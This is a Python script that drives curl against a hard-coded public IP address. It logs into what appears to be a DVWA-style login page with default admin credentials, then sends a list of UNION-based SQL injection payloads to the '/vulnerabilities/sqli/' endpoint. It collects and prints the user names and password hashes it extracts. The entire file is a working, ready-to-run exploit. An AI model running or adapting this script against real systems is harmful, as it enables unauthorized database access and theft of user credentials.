
import subprocess
import re
from html import unescape

# Step 1: Get login page and extract token
cmd = [
    'curl',
    '-s',
    '-c', '/tmp/cookies.txt',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", result.stdout)
token = token_match.group(1) if token_match else None
print(f"[*] Token: {token}")

# Step 2: Login
cmd = [
    'curl',
    '-s',
    '-b', '/tmp/cookies.txt',
    '-c', '/tmp/cookies.txt',
    '-d', f'username=admin&password=password&user_token={token}&Login=Login',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
print("[*] Logged in")

# Step 3: Now extract all users with password hashes using 2-column UNION
# Query is: SELECT first_name, last_name FROM users WHERE user_id = '$id'
# We need to match 2 columns

payloads = [
    "999 UNION SELECT CONCAT('ID:',user_id,' | USER:',user,' | PASS:',password), 'HASH' FROM users-- -",
    "999 UNION SELECT user, password FROM users-- -",
    "999' UNION SELECT user, password FROM users-- -",
    "1' UNION SELECT CONCAT(user_id,':',user), password FROM users-- -",
]

print("\n[*] Extracting user data with password hashes using 2-column UNION...\n")

extracted_data = {}

for payload in payloads:
    print(f"[*] Testing: {payload[:80]}...")
    
    cmd = [
        'curl',
        '-s',
        '-b', '/tmp/cookies.txt',
        '-d', f'id={payload}&Submit=Submit',
        'http://31.97.117.123/vulnerabilities/sqli/'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    
    # Look for pre section
    if '<pre>' in result.stdout:
        start = result.stdout.find('<pre>')
        end = result.stdout.find('</pre>', start) + 6
        section = result.stdout[start:end]
        section_text = unescape(section)
        
        # Skip if it's an error
        if "The used SELECT" in section_text or ("error" in section_text.lower() and "INSERT" not in section_text):
            print(f"[-] SQL error: {section_text[:100]}")
            continue
        
        print(f"[+] Got response:")
        print(section_text[:500])
        print()
        
        # Parse and extract user/password
        extracted_data[payload] = section_text

if extracted_data:
    print("\n" + "="*80)
    print("[+] EXTRACTED DATA:")
    print("="*80)
    for payload, data in extracted_data.items():
        print(f"\n[Payload: {payload[:60]}...]")
        print(data[:1000])
        print()

